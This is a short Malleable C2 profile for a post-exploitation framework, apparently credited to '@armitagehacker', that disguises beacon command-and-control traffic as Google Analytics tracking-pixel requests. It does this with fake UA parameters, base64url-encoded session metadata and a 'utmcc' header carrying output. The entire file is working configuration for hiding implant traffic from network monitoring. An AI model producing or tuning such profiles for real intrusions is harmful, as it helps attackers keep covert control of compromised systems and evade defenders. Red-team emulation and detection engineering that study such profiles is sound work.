# make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker

set sleeptime "5000";


http-get {
	set uri "/___utm.gif";
	client {
		parameter "utmac" "UA-2202604-2";
		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";
		header "plzwork" "something";

		metadata {
			base64url;
			#parameter "test";
			#uri-append;
			print;
		}
	}

	server {
		# *no* params in server block, doesn't make sense. That is specified by client
		# headers only
		header "Content-Type" "image/gif";
		header "http_get->server->header" "image/gif";

		output {
			print;
		}
	}
}

http-post {
	set uri "/__utm.gif";
	set verb "GET";
	client {
		id {
			base64url;
			parameter "utmac";
		}

		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";

		output {
			base64url;
			header "utmcc";
		}
	}

	server {
		# *no* params in server block, doesn't make sense. That is specified by client
		# headers only
		header "Content-Type" "image/gif";
		header "http_post->server->header" "image/gif";

		output {
			print;
		}
	}
}

